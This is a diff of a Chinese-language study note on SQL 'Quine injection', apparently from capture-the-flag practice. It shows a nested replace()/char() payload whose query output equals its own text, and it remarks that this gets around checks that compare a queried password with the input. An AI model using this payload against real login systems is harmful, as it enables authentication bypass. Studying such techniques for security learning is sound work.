@@ -23,10 +23,13 @@ select replace(".",char(46),".");
 ```sql
 select replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")');
 ```
+得到几乎相同了只有一点细微的差别
+![700](assets/Quine注入/file-20251217173850996.png)
 
 最终payload：
 ```sql
 replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
 ```
-![](assets/Quine注入/file-20251217172806694.png)
+![900](assets/Quine注入/file-20251217172806694.png)
 看到输入输出完全一样了
+这个就解决了一些sql查询密码等问题，让查询结果永远等于他自己
